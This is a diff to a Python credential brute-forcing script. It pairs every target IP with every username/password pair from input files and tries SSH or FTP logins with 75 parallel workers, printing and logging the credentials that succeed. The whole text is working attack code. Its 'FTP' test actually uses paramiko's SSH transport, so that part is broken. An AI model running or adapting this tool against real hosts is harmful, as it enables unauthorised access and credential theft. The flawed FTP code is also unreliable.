@@ -19,8 +19,15 @@ from docopt import docopt
 
 
 def write_output(results):
+    print("writing output file")
+    results_concatenated = {
+        k: [d.get(k) for d in results]
+        for k in set().union(*results)
+        }
+    print(results_concatenated)
     with open("brutus.log", "w+") as file:
-        file.write(json.dumps(results, indent=4, sort_keys=True))
+        file.write(json.dumps(results_concatenated, sort_keys=True,indent=4))
+        print(json.dumps(results_concatenated, sort_keys=True,indent=4))
 
 def parse_rhosts_file(rhosts_file):
     """
@@ -29,7 +36,7 @@ def parse_rhosts_file(rhosts_file):
     Arguments:
         rhosts_file:    file of ip address one per line
     """
-    print("parsing rhosts file: {}".format(rhosts_file))
+    print("parsing rhosts file into a list from file: {}".format(rhosts_file))
     rhosts = []
     with open(rhosts_file, "r") as file:
         for line in file:
@@ -38,7 +45,7 @@ def parse_rhosts_file(rhosts_file):
                 ipaddress.ip_address(ip)
                 rhosts.append(ip)
             except Exception:
-                print("ip addres not valid: {}".format(ip))
+                print("ip address not valid: {}".format(ip))
                 pass
     print(rhosts)
     return rhosts
@@ -50,7 +57,7 @@ def format_credentials(credentials_file):
     Arguments:
         credentials_file:   The source file passed into the cli tool
     """
-    print("Formating credentials into a dict from source file: {}".format(credentials_file))
+    print("putting credentials into a list from file: {}".format(credentials_file))
     credentials = []
     with open(credentials_file, "r") as file:
         for line in file:
@@ -59,7 +66,12 @@ def format_credentials(credentials_file):
     print(credentials)
     return credentials
 
-def ssh_test(creds, ip, port=22, timeout=2):
+def join_rhosts_creds(rhosts, credentials):
+    results = [rhost + " " + creds for rhost in rhosts for creds in credentials]
+    print(results)
+    return results
+
+def ssh_test(attempt, port=22, timeout=2):
     """
     Test user login.
     
@@ -68,10 +80,11 @@ def ssh_test(creds, ip, port=22, timeout=2):
         password:   password for the user
     
     Return:
-        Returns True for success False for failure and the server ip
+        
     """
-    username = creds.split(" ")[0]
-    password = creds.split(" ")[1]
+    ip = attempt.split(" ")[0]
+    username = attempt.split(" ")[1]
+    password = attempt.split(" ")[2]
     try:
         client = paramiko.SSHClient()
         client.load_system_host_keys()
@@ -79,12 +92,12 @@ def ssh_test(creds, ip, port=22, timeout=2):
         client.connect(ip, port=port, username=username, password=password, timeout=5)
         client.close()
         print("login succeeded on {} with user {} and password {}".format(ip, username, password))
-        return {"ip": ip, "username": username, "password": password}
+        return {ip: {"username": username, "password": password}}
     except Exception:
         print("failed to login to {} with user {} and password {}".format(ip, username, password))
         return False
 
-def ftp_test(creds, ip, port=21, timeout=2):
+def ftp_test(attempt, port=21, timeout=2):
     """
     Test user login.
     
@@ -93,20 +106,21 @@ def ftp_test(creds, ip, port=21, timeout=2):
         testpassword:   password for the user
     
     Return:
-        Returns True for success False for failure and the server ip
+        
     """
-    username = creds.split(" ")[0]
-    password = creds.split(" ")[1]
+    ip = attempt.split(" ")[0]
+    username = attempt.split(" ")[1]
+    password = attempt.split(" ")[2]
     try:
         t = paramiko.Transport((ip, port))
         t.connect(username=username, password=password, timeout=5)
         print("login succeeded on {} with user {} and password {}".format(ip, username, password))
-        return {"ip": ip, "username": username, "password": password}
+        return {ip: {"username": username, "password": password}}
     except Exception:
         print("failed to login to {} with user {} and password {}".format(ip, username, password))
         return False
 
-def concurrent_login_attempts(service, credentials, rhosts):
+def concurrent_login_attempts(service, attempts):
     """
     currently run login attempts for a service
 
@@ -115,28 +129,26 @@ def concurrent_login_attempts(service, credentials, rhosts):
         credential_file:    A dictionary of credentials
     """
     print("running concurrent login attampts for service {}".format(service))
-    results_list = {}
+    results_list = []
     
     with concurrent.futures.ProcessPoolExecutor(max_workers=75) as pool:
-        for ip in rhosts:
-            if service.lower() == "ssh":
-                results = {pool.submit(ssh_test, creds, str(ip)):creds for creds in credentials}
-            elif service.lower() == "ftp":
-                results = {pool.submit(ftp_test, creds, str(ip)):creds for creds in credentials}
-            for future in concurrent.futures.as_completed(results):
-                if future.result():
-                    attempt_id = random.randint(1,100000)
-                    results_list[attempt_id] = future.result()
+        if service.lower() == "ssh":
+            results = {pool.submit(ssh_test, attempt):attempt for attempt in attempts}
+        elif service.lower() == "ftp":
+            results = {pool.submit(ftp_test, attempt):attempt for attempt in attempts}
+        for future in concurrent.futures.as_completed(results):
+            if future.result():
+                results_list.append(future.result())
+    print(results_list)
     return results_list
 
 def main():
     opts = docopt(__doc__)
-
     rhosts = parse_rhosts_file(opts['--rhosts'])
     credentials = format_credentials(opts['--credentials'])
-    results = concurrent_login_attempts(opts['--service'], credentials, rhosts)
+    attempts = join_rhosts_creds(rhosts, credentials)
+    results = concurrent_login_attempts(opts['--service'], attempts)
     write_output(results)
-    print(json.dumps(results, indent=4, sort_keys=True))
 
 if __name__ == '__main__':
     main()
